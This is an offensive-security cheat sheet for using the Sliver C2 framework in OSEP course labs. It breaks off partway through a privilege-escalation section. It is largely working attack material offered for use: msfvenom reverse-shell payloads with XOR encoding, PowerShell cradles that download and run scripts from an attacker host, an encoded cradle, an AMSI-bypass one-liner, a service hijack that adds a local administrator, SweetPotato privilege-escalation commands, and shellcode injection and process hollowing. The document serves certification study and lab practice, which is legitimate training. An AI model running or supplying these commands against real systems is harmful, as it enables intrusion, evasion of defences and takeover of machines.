
# Sliver CheatSheet for OSEP

Considering the documentation of sliver is really bad, thought of creating this repository to help people with usage of Sliver C2 for OSEP. The guide is specific to OSEP but the usage should remain the same for real world projects.

It contains all my notes from the course content and challenge labs and is more than enough to do them and pass the exam. The notes are categorised by initial setup, compromise, privileges escalation, post exploitation and other sections.

The C# and PowerShell files throughout the cheat sheet should be publicly accessible, just search the tool name publicly. I have also compiled many of them during the duration of OSEP prep and have included them within the folder `bins` containing my structure, these would be detected as malicious if downloaded, feel free to download from the public repos and compile them. 

## Table of Contents


- [Installation](#installation)
	- [Server](#server)
	- [Client](#client)
	- [Armory packages](#armory-packages)
- [Q & A](#q--a)
- [Listeners](#listeners)
- [Payloads](#payloads)
- [Hosts File](#hosts-file)
- [Nmap Scanning](#nmap-scanning)
- [Dirsearch](#dirsearch)
- [Implant Duplication & Migration](#implant-duplication--migration)
- [Bypasses](#bypasses)
	- [AMSI & CLM](#amsi--clm)
		- [SharpSh](#sharpsh)
		- [Stracciatella](#stracciatella)
	- [Application Whitelisting](#application-whitelisting)
- [Privileges Escalation](#privileges-escalation)
	- [Checks](#checks)
	- [Modifiable Service](#modifiable-service)
	- [SeImpersonatePrivileges](#seimpersonateprivileges)
	- [AlwaysInstallElevated](#alwaysinstallelevated)
	- [UAC Bypass](#uac-bypass)
		- [ComputerDefaults](#computerdefaults)
		- [Fodhelper](#fodhelper)
- [Privileged User - Post-Exploitation](#privileged-user---post-exploitation)
	- [Flags](#flags)
	- [Enable RDP](#enable-rdp)
	- [Enable WinRM](#enable-winrm)
	- [Disable Defender & Firewall](#disable-defender--firewall)
	- [Persistence](#persistence)
	- [Restarting the machine](#restarting-the-machine)
- [Credentials Dumping](#credentials-dumping)
	- [Mimikatz](#mimikatz)
		- [Disable LSA protection](#disable-lsa-protection)
		- [Machine Credentials](#machine-credentials)
		- [PEZor - Mimikatz](#pezor---mimikatz)
	- [LaZagne](#lazagne)
	- [impacket-secretsdump](#impacket-secretsdump)
	- [nxc](#nxc)
	- [SharpKatz](#sharpkatz)
	- [Password Spraying](#password-spraying)
- [Token Creation & Stealing](#token-creation--stealing)
	- [PassTheHash PTH](#passthehash-pth)
		- [Mimikatz - PWSH port](#mimikatz---pwsh-port)
		- [Mimikatz - PEZor](#mimikatz---pezor)
		- [SharpNamedPipePTH](#sharpnamedpipepth)
	- [make-token](#make-token)
	- [netexec](#netexec)
	- [runas](#runas)
		- [Injection](#injection)
		- [Direct Shell](#direct-shell)
	- [Rubeus createnetonly](#rubeus-createnetonly)
	- [$cred in pwsh](#cred-in-pwsh)
	- [Steal Token](#steal-token)
		- [migrate](#migrate)
		- [execute-shellcode](#execute-shellcode)
		- [SharpImpersonation](#sharpimpersonation)
		- [Msfconsole](#msfconsole)
- [Tunneling](#tunneling)
	- [Portfwd](#portfwd)
	- [Socks5 Proxy](#socks5-proxy)
	- [Ligolo](#ligolo)
		- [Port Forwarding through Ligolo](#port-forwarding-through-ligolo)
- [Lateral Movement](#lateral-movement)
	- [PsExec](#psexec)
	- [SharpRDP](#sharprdp)
- [Domain Enumeration](#domain-enumeration)
	- [Laps](#laps)
	- [SharpHound](#sharphound)
		- [Linux](#linux)
	- [PingCastle](#pingcastle)
	- [ADPeas](#adpeas)
	- [Trusts](#trusts)
		- [PowerView](#powerview)
		- [ADSearch](#adsearch)
	- [Shares Enumeration](#shares-enumeration)
- [Domain Exploitation](#domain-exploitation)
	- [Persistence](#persistence)
	- [Kerberoasting](#kerberoasting)
	- [ACLs Abuse](#acls-abuse)
		- [ForcePasswordChange on User](#forcepasswordchange-on-user)
		- [GenericWrite on User](#genericwrite-on-user)
		- [WriteDacl on Group](#writedacl-on-group)
			- [Windows Abuse](#windows-abuse)
			- [Linux Abuse](#linux-abuse)
	- [Unconstrained Delegation](#unconstrained-delegation)
	- [Constrained Delegation](#constrained-delegation)
		- [Machine](#machine)
		- [User](#user)
		- [Linux](#linux)
	- [RBCD](#rbcd)
		- [GenericWrite](#genericwrite)
- [Silver Ticket](#silver-ticket)
	- [Windows](#windows)
	- [Linux](#linux)
- [Domain Lateral Movement](#domain-lateral-movement)
	- [Password Change](#password-change)
	- [Golden Ticket](#golden-ticket)
		- [Child Domain to Parent Domain](#child-domain-to-parent-domain)
		- [Parent Domain to Child Domain](#parent-domain-to-child-domain)
- [MSSQL](#mssql)
	- [SQLMap](#sqlmap)
	- [Queries](#queries)
	- [MSSQLand](#mssqland)
	- [MSSQLpwner](#mssqlpwner)
	- [SQLRecon](#sqlrecon)
		- [Links Exploitation](#links-exploitation)
		- [MSSQL - Relaying & Impersonation](#mssql---relaying--impersonation)
	- [PowerUPSQL](#powerupsql)
- [Armory](#armory)
	- [SharpLaps](#sharplaps)
	- [SharpView](#sharpview)
	- [SharpHound](#sharphound)
	- [SharpSecDump](#sharpsecdump)
	- [sharpsh](#sharpsh)
	- [SharpMapExec](#sharpmapexec)
	- [SharpUp](#sharpup)
	- [SharpRDP](#sharprdp)
	- [Rubeus](#rubeus)
	- [NoPowerShell](#nopowershell)
	- [Sharp-SMBExec](#sharp-smbexec)
	- [SharpDPAPI](#sharpdpapi)
	- [SharpWMI](#sharpwmi)
- [BOFs](#bofs)
	- [jump-psexec](#jump-psexec)
	- [jump-wmiexec](#jump-wmiexec)

## Installation
Visit the sliver [releases page](https://github.com/BishopFox/sliver/releases) and install the pre-compiled Server and Client for your OS. Sliver also enables multiple operators to join using profiles since each operator can be generated a different profile.

### Server
```bash
# Install suitable Binary for your OS
wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
chmod +x ./sliver-server_linux
./sliver-server_linux

# Operator profile
[server] sliver > new-operator -n <operator_name> -l <listening_IP>

[*] Generating new client certificate, please wait ... 
[*] Saved new client config to: /<path_to_generated_profile>/<operator_name>_<listening _IP>.cfg 

# Enabling Multiplayer mode
[server] sliver > multiplayer

[*] Multiplayer mode enabled!
[*] <operator_name> has joined the game
```
> **Note**: Without enabling the `multiplayer` mode, no one will be able to connect to Sliver's server.

### Client
```bash
wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
chmod +x ./sliver-client_linux
./sliver-client_linux import /<path_to_generated_profile>/<operator_name>_<listening _IP>.cfg 
# After importing the profile start Client
./sliver-client_linux 
```

### Armory packages
[Armory](https://github.com/sliverarmory) contains a set of pre-installed .NET binaries ready to use for the client and server component.

```bash
sliver > armory install all

? Install 21 aliases and 140 extensions? Yes
[*] Installing alias 'SharPersist' (v0.0.2) ... done!
[*] Installing alias 'sqlrecon' (v3.8.0) ... done!
[*] Installing alias 'SharpLAPS' (v0.0.1) ... done!
[*] Installing alias 'SharpView' (v0.0.1) ... done!
[*] Installing alias 'SharpHound v4' (v0.0.2) ... done!
[*] Installing alias 'SharpSecDump' (v0.0.1) ... done!
[*] Installing alias 'sharpsh' (v0.0.1) ... done!
[*] Installing alias 'SharpMapExec' (v0.0.1) ... done!
[*] Installing alias 'KrbRelayUp' (v0.0.2) ... done!
[*] Installing alias 'Certify' (v0.0.4) ... done!
[*] Installing alias 'SharpUp' (v0.0.2) ... done!
[*] Installing alias 'Sharp Hound 3' (v0.0.2) ... done!
[*] Installing alias 'SharpSCCM' (v2.0.12) ... done!
[*] Installing alias 'SharpRDP' (v0.0.1) ... done!
[*] Installing alias 'Rubeus' (v0.0.25) ... done!
[*] Installing alias 'NoPowerShell' (v0.0.2) ... done!
[*] Installing alias 'Sharp SMBExec' (v0.0.3) ... done!
[*] Installing alias 'SharpDPAPI' (v0.0.4) ... done!
[*] Installing alias 'Sharp WMI' (v0.0.2) ... done!
[*] Installing alias 'Seatbelt' (v0.0.6) ... done!
[*] Installing alias 'SharpChrome' (v0.0.4) ... done!
[*] Installing extension 'ldapsigncheck' (v0.0.1) ... done!
[*] Installing extension 'c2tc-psx' (v0.0.9) ... done!
[*] Installing extension 'remote-shspawnas' (v0.1.1) ... done!
[*] Installing extension 'remote-sc-create' (v0.1.1) ... done!
[*] Installing extension 'inject-ntqueueapcthread' (v0.1.1) ... done!
[*] Installing extension 'sa-get-netsession' (v0.0.23) ... done!
[*] Installing extension 'jump-wmiexec' (v0.0.2) ... done!
[*] Installing extension 'sa-nettime' (v0.0.23) ... done!
[*] Installing extension 'remote-reg-save' (v0.1.1) ... done!
[*] Installing extension 'handlekatz' (v0.0.1) ... done!
[*] Installing extension 'sa-sc-qfailure' (v0.0.23) ... done!
[*] Installing extension 'c2tc-psw' (v0.0.9) ... done!
[*] Installing extension 'inject-svcctrl' (v0.1.1) ... done!
[*] Installing extension 'c2tc-psm' (v0.0.9) ... done!
[*] Installing extension 'remote-schtasks-delete' (v0.1.1) ... done!
[*] Installing extension 'sa-adcs-enum-com2' (v0.0.23) ... done!
[*] Installing extension 'sa-schtasksquery' (v0.0.23) ... done!
[*] Installing extension 'credman' (v1.0.7) ... done!
[*] Installing extension 'nanorobeus' (v0.0.2) ... done!
[*] Installing extension 'sa-get-password-policy' (v0.0.23) ... done!
[*] Installing extension 'remote-setuserpass' (v0.1.1) ... done!
[*] Installing extension 'tgtdelegation' (v0.0.4) ... done!
[*] Installing extension 'sa-netstat' (v0.0.23) ... done!
[*] Installing extension 'sa-sc-qdescription' (v0.0.23) ... done!
[*] Installing extension 'delegationbof' (v0.0.2) ... done!
[*] Installing extension 'raw-keylogger' (v0.0.7) ... done!
[*] Installing extension 'inject-clipboard' (v0.1.1) ... done!
[*] Installing extension 'remote-sc-start' (v0.1.1) ... done!
[*] Installing extension 'inject-amsi-bypass' (v0.0.2) ... done!
[*] Installing extension 'remote-chrome-key' (v0.1.1) ... done!
[*] Installing extension 'remote-reg-set' (v0.1.1) ... done!
[*] Installing extension 'sa-adv-audit-policies' (v0.0.23) ... done!
[*] Installing extension 'c2tc-psk' (v0.0.9) ... done!
[*] Installing extension 'sa-netlocalgroup2' (v0.0.23) ... done!
[*] Installing extension 'sa-notepad' (v0.0.23) ... done!
[*] Installing extension 'sa-driversigs' (v0.0.23) ... done!
[*] Installing extension 'nanodump' (v0.0.5) ... done!
[*] Installing extension 'sa-listdns' (v0.0.23) ... done!
[*] Installing extension 'c2tc-petitpotam' (v0.0.9) ... done!
[*] Installing extension 'sa-list_firewall_rules' (v0.0.23) ... done!
[*] Installing extension 'sa-cacls' (v0.0.23) ... done!
[*] Installing extension 'sa-ldapsearch' (v0.0.23) ... done!
[*] Installing extension 'sa-routeprint' (v0.0.23) ... done!
[*] Installing extension 'c2tc-smbinfo' (v0.0.9) ... done!
[*] Installing extension 'sa-netshares' (v0.0.23) ... done!
[*] Installing extension 'remote-get_priv' (v0.1.1) ... done!
[*] Installing extension 'sa-ipconfig' (v0.0.23) ... done!
[*] Installing extension 'inject-dde' (v0.1.1) ... done!
[*] Installing extension 'remote-reg-delete' (v0.1.1) ... done!
[*] Installing extension 'remote-adduser' (v0.1.1) ... done!
[*] Installing extension 'inject-createremotethread' (v0.1.1) ... done!
[*] Installing extension 'bof-servicemove' (v0.0.1) ... done!
[*] Installing extension 'sa-vssenum' (v0.0.23) ... done!
[*] Installing extension 'sa-regsession' (v0.0.23) ... done!
[*] Installing extension 'inject-setthreadcontext' (v0.1.1) ... done!
[*] Installing extension 'sa-adcs-enum-com' (v0.0.23) ... done!
[*] Installing extension 'sa-schtasksenum' (v0.0.23) ... done!
[*] Installing extension 'remote-procdump' (v0.1.1) ... done!
[*] Installing extension 'sa-wmi-query' (v0.0.23) ... done!
[*] Installing extension 'c2tc-domaininfo' (v0.0.9) ... done!
[*] Installing extension 'remote-sc_failure' (v0.1.1) ... done!
[*] Installing extension 'sa-whoami' (v0.0.23) ... done!
[*] Installing extension 'secinject' (v0.0.1) ... done!
[*] Installing extension 'remote-sc-delete' (v0.1.1) ... done!
[*] Installing extension 'remote-addusertogroup' (v0.1.1) ... done!
[*] Installing extension 'hollow' (v0.0.1) ... done!
[*] Installing extension 'coff-loader' (v1.0.14) ... done!
[*] Installing extension 'sa-enum-local-sessions' (v0.0.23) ... done!
[*] Installing extension 'remote-unexpireuser' (v0.1.1) ... done!
[*] Installing extension 'sa-reg-query' (v0.0.23) ... done!
[*] Installing extension 'sa-sc-enum' (v0.0.23) ... done!
[*] Installing extension 'hashdump' (v1.0.0) ... done!
[*] Installing extension 'inject-ctray' (v0.1.1) ... done!
[*] Installing extension 'sa-find-loaded-module' (v0.0.23) ... done!
[*] Installing extension 'c2tc-kerberoast' (v0.0.9) ... done!
[*] Installing extension 'remote-schtasksrun' (v0.1.1) ... done!
[*] Installing extension 'inject-etw-bypass' (v0.0.3) ... done!
[*] Installing extension 'remote-office-tokens' (v0.1.1) ... done!
[*] Installing extension 'sa-listmods' (v0.0.23) ... done!
[*] Installing extension 'inline-execute-assembly' (v0.0.1) ... done!
[*] Installing extension 'c2tc-psc' (v0.0.9) ... done!
[*] Installing extension 'sa-sc-qtriggerinfo' (v0.0.23) ... done!
[*] Installing extension 'syscalls_shinject' (v0.0.1) ... done!
[*] Installing extension 'sa-locale' (v0.0.23) ... done!
[*] Installing extension 'c2tc-winver' (v0.0.9) ... done!
[*] Installing extension 'chromiumkeydump' (v0.0.2) ... done!
[*] Installing extension 'sa-adcs-enum' (v0.0.23) ... done!
[*] Installing extension 'sa-netloggedon2' (v0.0.23) ... done!
[*] Installing extension 'remote-adcs-request' (v0.1.1) ... done!
[*] Installing extension 'sa-nslookup' (v0.0.23) ... done!
[*] Installing extension 'kerbrute' (v0.0.1) ... done!
[*] Installing extension 'bof-roast' (v0.0.2) ... done!
[*] Installing extension 'find-proc-handle' (v0.0.2) ... done!
[*] Installing extension 'remote-enable-user' (v0.1.1) ... done!
[*] Installing extension 'remote-slack_cookie' (v0.1.1) ... done!
[*] Installing extension 'remote-sc-description' (v0.1.1) ... done!
[*] Installing extension 'sa-uptime' (v0.0.23) ... done!
[*] Installing extension 'sa-tasklist' (v0.0.23) ... done!
[*] Installing extension 'sa-netuptime' (v0.0.23) ... done!
[*] Installing extension 'inject-ntcreatethread' (v0.1.1) ... done!
[*] Installing extension 'mimikatz' (v0.0.1) ... done!
[*] Installing extension 'jump-psexec' (v0.0.2) ... done!
[*] Installing extension 'sa-arp' (v0.0.23) ... done!
[*] Installing extension 'sa-sc-qc' (v0.0.23) ... done!
[*] Installing extension 'inject-conhost' (v0.1.1) ... done!
[*] Installing extension 'sa-enum-filter-driver' (v0.0.23) ... done!
[*] Installing extension 'winrm' (v0.0.1) ... done!
[*] Installing extension 'remote-ghost_task' (v0.1.1) ... done!
[*] Installing extension 'sa-env' (v0.0.23) ... done!
[*] Installing extension 'remote-lastpass' (v0.1.1) ... done!
[*] Installing extension 'remote-sc-stop' (v0.1.1) ... done!
[*] Installing extension 'c2tc-lapsdump' (v0.0.9) ... done!
[*] Installing extension 'sa-netlocalgroup' (v0.0.23) ... done!
[*] Installing extension 'remote-suspendresume' (v0.1.1) ... done!
[*] Installing extension 'c2tc-spray-ad' (v0.0.9) ... done!
[*] Installing extension 'scshell' (v0.0.2) ... done!
[*] Installing extension 'sa-netview' (v0.0.23) ... done!
[*] Installing extension 'inject-tooltip' (v0.1.1) ... done!
[*] Installing extension 'remote-process-destroy' (v0.1.1) ... done!
[*] Installing extension 'unhook-bof' (v0.0.2) ... done!
[*] Installing extension 'sa-sc-query' (v0.0.23) ... done!
[*] Installing extension 'inject-uxsubclassinfo' (v0.1.1) ... done!
[*] Installing extension 'c2tc-askcreds' (v0.0.9) ... done!
[*] Installing extension 'remote-schtasks-stop' (v0.1.1) ... done!
[*] Installing extension 'sa-windowlist' (v0.0.23) ... done!
[*] Installing extension 'c2tc-kerbhash' (v0.0.9) ... done!
[*] Installing extension 'c2tc-addmachineaccount' (v0.0.9) ... done!
[*] Installing extension 'sa-netgroup' (v0.0.23) ... done!
[*] Installing extension 'sa-get-netsession2' (v0.0.23) ... done!
[*] Installing extension 'sa-probe' (v0.0.23) ... done!
[*] Installing extension 'find-module' (v0.0.2) ... done!
[*] Installing extension 'inject-kernelcallbacktable' (v0.1.1) ... done!
[*] Installing extension 'threadless-inject' (v0.0.1) ... done!
[*] Installing extension 'remote-process-list-handles' (v0.1.1) ... done!
[*] Installing extension 'c2tc-wdtoggle' (v0.0.9) ... done!
[*] Installing extension 'c2tc-startwebclient' (v0.0.9) ... done!
[*] Installing extension 'sa-netloggedon' (v0.0.23) ... done!
[*] Installing extension 'remote-sc-config' (v0.1.1) ... done!
[*] Installing extension 'patchit' (v0.0.1) ... done!
[*] Installing extension 'c2tc-klist' (v0.0.9) ... done!

[*] All packages installed

```

## Q & A

- When I run with `-i`, I get CLM runtime error
  - Run the same command again, twice, thrice, it will work out

- Sliver hangs when I run ligolo or other binaries
  - Press Ctrl + C and then re-run sliver and use the session, it should work fine 

- `SweetPotato` shell dies right after I receive it
	- The moment you get the shell either
		- Run phollow or
		- Disable AV using the oneliner of sharpsh
	- Repeat the above two steps (the AV disablement is favoured to process hollowing)

- I can't figure out sliver quote issues
	- Same lol but with enough practice and time waste, you'll get it

- Why is there a hav0c-ps.txt file everywhere? 
	- I got lazy and didn't change the name as I was using Havoc before Sliver
	- Should be present within https://github.com/Anon-Exploiter/sliver-cheatsheet/blob/main/bins/www/html/hav0c-ps.txt



## Listeners

```powershell
# Sliver listeners
# 64 bit shell
profiles new --http 10.10.10.11:8088 --format shellcode osep
stage-listener --url tcp://10.10.10.11:4443 --profile osep
http -L 10.10.10.11 --lport 8088


# 32 Bit shell
profiles new --http 10.10.10.11:9090 --format shellcode -a x86 osepx86
stage-listener --url tcp://10.10.10.11:5553 --profile osepx86
http -L 10.10.10.11 --lport 9090


# Lateral movement
profiles new --http 10.10.10.11:8099 --format service osep-lateral
http -L 10.10.10.11 --lport 8099
```


## Payloads

To be used with files in the `payloads` directory: https://github.com/Anon-Exploiter/sliver-cheatsheet/tree/main/payloads

> XOR encryption with 2

```powershell
# Payloads
# 64 bit shell
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4443 EXITFUNC=thread -f raw -o /home/kali/OSEP/hav0c/sliver.x64.bin


# PowerShell Payload
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4443 EXITFUNC=thread -f raw | xxd -ps -c 1 | python3 -c 'import sys; key = 2; print("[Byte[]] $buf = " + ",".join([f"0x{(int(x, 16) ^ key):02X}" for x in sys.stdin.read().split()]))'


# C#
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4443 EXITFUNC=thread -f raw | python3 -c 'key = 2; import sys; data = sys.stdin.buffer.read(); encrypted = bytes([b ^ key for b in data]); print(f"byte[] buf = new byte[{len(encrypted)}] {{ " + ", ".join([f"0x{b:02X}" for b in encrypted]) + " };")'


# ASPX Payloads
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4443 EXITFUNC=thread -f raw | python3 -c 'key = 2; import sys; data = sys.stdin.buffer.read(); encrypted = bytes([b ^ key for b in data]); print(f"byte[] vL8fwOy_ = new byte[{len(encrypted)}] {{ " + ",".join([f"0x{b:02X}" for b in encrypted]) + " };")'


# VB - XOR
payload="cv2.docm"
python3 -c "payload=\"$payload\"; print(''.join(f'{ord(char) + 17:03}' for char in payload))"

payload="powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://10.10.10.11/hav0c-ps.txt'))"
python3 -c "payload=\"$payload\"; print(''.join(f'{ord(char) + 17:03}' for char in payload))"


# PowerShell Session
echo -en "(New-Object System.Net.WebClient).DownloadString('http://10.10.10.11/hav0c-ps.txt') | IEX" | iconv -t UTF-16LE | base64 -w 0
powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==



# --
# 32 bit shell
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=5553 EXITFUNC=thread -f raw -o /home/kali/OSEP/hav0c/sliver.x86.bin


# VBS payload
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=5553 EXITFUNC=thread -f raw | xxd -ps -c 1 | python3 -c 'import sys; key = 2; data = [str(int(x, 16) ^ key) for x in sys.stdin.read().split()]; chunk_size = 50; chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]; print("buf = Array(", end=""); print(", _\n".join([", ".join(chunk) for chunk in chunks]) + ")")'


# PowerShell payload
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=5553 EXITFUNC=thread -f raw | xxd -ps -c 1 | python3 -c 'import sys; key = 2; print("[Byte[]] $buf = " + ",".join([f"0x{(int(x, 16) ^ key):02X}" for x in sys.stdin.read().split()]))'
```


Sliver implant 

```powershell
generate beacon --http 10.10.250.10:8088 --name sliver.obfuscated --os windows --seconds 5 --jitter 0 --evasion
```


## Hosts File 

```powershell
cd ~/tools/UpdateHostsFile

sudo python Update-Hosts-File.py --protocols smb,rdp --subnet 192.168.130.0/24
sudo python Update-Hosts-File.py --protocols smb,rdp --subnet 172.16.130.0/24
```


## Nmap Scanning

```powershell
nmap -p- -sC -sV -A -Pn -n --open --append -oN 10.10.200.100 10.10.200.100
```


## Dirsearch

```powershell
dirsearch -u http://10.10.200.100/ -t 100 --full-url -x 404
```


## Implant Duplication & Migration

```powershell
# All same, they all launch in x86, regardless of bins, no difference really - -T for same process token
execute C:\\windows\\system32\\notepad.exe
execute -T notepad
execute C:\\windows\\SysWOW64\\notepad.exe


# Launching process with rubues
rubeus -t 20 -- createnetonly /program:C:\\windows\\SysWOW64\\notepad.exe
rubeus -t 20 -- createnetonly /program:C:\\windows\\system32\\cmd.exe


# Get process list by (usually last process)
ps -e notepad


# Get explorer for stability
ps -e explorer


# Migrate into the created process (two ways, migrate or execute-shellcode)
# This works the best on x86 with AV
migrate -p 3532


# Using -A or without, makes no difference, sliver automatically detects the arch for 32 bit
execute-shellcode -A 386 -p 1524 /home/kali/OSEP/hav0c/sliver.x86.bin
execute-shellcode -p 6896 /home/kali/OSEP/hav0c/sliver.x86.bin


# x64 - ShikataGaNai
execute-shellcode -p 5544 /home/kali/OSEP/hav0c/sliver.x64.bin
execute-shellcode -S -r -I 10 -p 9088 /home/kali/OSEP/hav0c/sliver.x64.bin


# Process Hollowing - works really well (recommended)
hollow svchost.exe /home/kali/OSEP/hav0c/sliver.x64.bin


## You may get the following error using `hollow` but the shell will be received regardless
[!] Call extension error: rpc error: code = Unknown desc = The parameter is incorrect.
```


## Bypasses

### AMSI & CLM

#### SharpSh

> Lots of usage/examples in upcoming commands for enumeration

```powershell
# Running a single command
sharpsh -t 20 -- '-c "whoami /all"'
sharpsh -t 20 -- '-c "$ExecutionContext.SessionState.LanguageMode"'


# Running a script from remote address (without args) - just pass 1 as the arg as it requires something or won't run
sharpsh -t 200 -- '-u http://10.10.10.11/powershell-scripts/Footholder-V3.ps1 -c 1'


# Running a script from remote address (with args)
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerUp.ps1 -c "Invoke-AllChecks"'
sharpsh -t 200 -- '-u http://10.10.10.11/powershell-scripts/HostRecon.ps1 -c "Invoke-HostRecon"'


# Encoding of commands with lots of quotes (use cyberchef)
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
sharpsh -- -e -c TmV3LUl0ZW1Qcm9wZXJ0eSAiSEtDVTpcc29mdHdhcmVcY2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hbmQiIC1OYW1lICJEZWxlZ2F0ZUV4ZWN1dGUiIC1WYWx1ZSAiIiAtRm9yY2U=


# Running commands with length > 256 characters - Sliver uses donut on backend which only supports 256 chars, run within process using `-i`
Invoke-Mimikatz -Command "privilege::debug token::elevate `"sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff`" exit"
sharpsh -i -t 40 -- -u 'http://10.10.10.11/powershell-scripts/Invoke-Mimikatz.ps1' -e -c SW52b2tlLU1pbWlrYXR6IC1Db21tYW5kICJwcml2aWxlZ2U6OmRlYnVnIHRva2VuOjplbGV2YXRlIGAic2VrdXJsc2E6OnB0aCAvdXNlcjpBZG1pbmlzdHJhdG9yIC9kb21haW46aW5maW5pdHkuY29tIC9udGxtOjVmOTE2M2NhM2I2NzNhZGZmZjI4MjhmMzY4Y2EzNzYwYCIgZXhpdCI=
```

#### Stracciatella

> Same args as SharpSh

```powershell
execute-assembly -i /home/kali/tools/bins/csharp-files/Stracciatella.exe -c "$ExecutionContext.SessionState.LanguageMode"
```


### Application Whitelisting

Sliver can run C# bins within the current process so we can use all those to enumerate, two ways:
- use the argument `-i` with `execute-assembly`
- `inline-execute-assembly`

```powershell
# execute-assembly
sharpup -- audit
sharpup -i -- audit
execute-assembly -i -- /home/kali/tools/bins/csharp-files/SharpUp.exe audit


# inline-execute-assembly
inline-execute-assembly /home/kali/tools/bins/csharp-files/SharpUp.exe audit
```



## Privileges Escalation

### Checks

> For application whitelisting, add `-i` for inline-execution

```powershell
# Check privs
execute -o whoami /all


# Enumerate permissions
seatbelt -- -group=all
seatbelt -- -group=user


# Run sharpup to audit
sharpup -- audit
sharpup -i -- audit


# Run PowerUp
sharpsh -t 40 -- '-u http://10.10.10.11/powershell-scripts/PowerUp.ps1 -c "Invoke-AllChecks"'


# We can modify a service, check Get-ServiceAcl what we can modify/create
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/Get-ServiceAcl.ps1 -c "Get-ServiceAcl -Name SNMPTRAP | select -expand Access"'


# Check Registry for autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"


# HostRecon
sharpsh -t 200 -- '-u http://10.10.10.11/powershell-scripts/HostRecon.ps1 -c "Invoke-HostRecon"'


# Footholder-V3.ps1
sharpsh -t 200 -- '-u http://10.10.10.11/powershell-scripts/Footholder-V3.ps1 -c 1'


# winPEAS - 400 secs wait - better to do interactively
sharpsh -t 400 -- '-u http://10.10.10.11/powershell-scripts/winPEAS.ps1 -c 1'


# Winpeas - With oneliner AMSI bypass
shell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
iex((new-object system.net.webclient).downloadstring('http://10.10.10.11/powershell-scripts/winPEAS.ps1'))


# Load within powershell itself (when required)
powershell -ep bypass
iex((new-object system.net.webclient).downloadstring('http://10.10.10.11/powershell-scripts/PowerUp.ps1'))
Invoke-AllChecks
```


### Modifiable Service

Add a domain user within the local admins group on the machine

```powershell
execute -o sc qc SNMPTRAP
execute -o sc config SNMPTRAP binPath= "net localgroup Administrators domain.com\\user /add" obj= "NT AUTHORITY\\SYSTEM"
execute -o sc config SNMPTRAP start= auto
execute -o sc qc SNMPTRAP
execute -o sc start SNMPTRAP


# check if now in local admins
execute -o net localgroup administrators
```


### SeImpersonatePrivileges

> Try EfsRpc if the by default way does not work with SweetPotato

```powershell
# We can use donut to get the shell, change IP address
donut -i /home/kali/tools/bins/csharp-files/SweetPotato.exe -a 2 -b 2 -p "-p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a \"IEX((new-object net.webclient).downloadstring('http://10.10.10.11/hav0c-ps.txt'))\"" -o /home/kali/tools/bins/csharp-files/SweetPotato.bin


# Using EfsRpc
donut -i /home/kali/tools/bins/csharp-files/SweetPotato.exe -a 2 -b 2 -p "-e EfsRpc -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a \"IEX((new-object net.webclient).downloadstring('http://10.10.10.11/hav0c-ps.txt'))\"" -o /home/kali/tools/bins/csharp-files/SweetPotato.bin


# For running directly using exec-assem
execute-assembly /home/kali/tools/bins/csharp-files/SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"-ep bypass -nop iex (New-Object System.Net.WebClient).DownloadString(\'http://10.10.10.11/hav0c-ps.txt\')\"
execute-assembly /home/kali/tools/bins/csharp-files/SweetPotato.exe -e EfsRpc -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"-ep bypass -nop iex (New-Object System.Net.WebClient).DownloadString(\'http://10.10.10.11/hav0c-ps.txt\')\"


# Run a sacrifical process
execute notepad
ps -e notepad


# Inject into the process - THIS IS RECOMMENDED
execute-shellcode -S -r -I 30 -p 2060 /home/kali/tools/bins/csharp-files/SweetPotato.bin


# We can run this and get another shell
execute-shellcode -i -S -r -I 30 /home/kali/tools/bins/csharp-files/SweetPotato.bin
execute-shellcode -S -r -I 30 /home/kali/tools/bins/csharp-files/SweetPotato.bin


# Once we get the shell, make sure to do implant duplication using phollow as this one will get killed by AV sooner or later
hollow svchost.exe /home/kali/OSEP/hav0c/sliver.x64.bin
```


### AlwaysInstallElevated

```powershell
# Install wixl
sudo apt install wixl


# Clone the MSI-AlwaysInstallElevated repo
cd ~/tools
git clone https://github.com/KINGSABRI/MSI-AlwaysInstallElevated
cd ~/tools/MSI-AlwaysInstallElevated


# Copy C# OSEP binary with XOR encrypted shellcode into current directory
sudo cp /home/kali/OSEP/hav0c/sliver.x64.exe .
sudo chmod 777 sliver.x64.exe


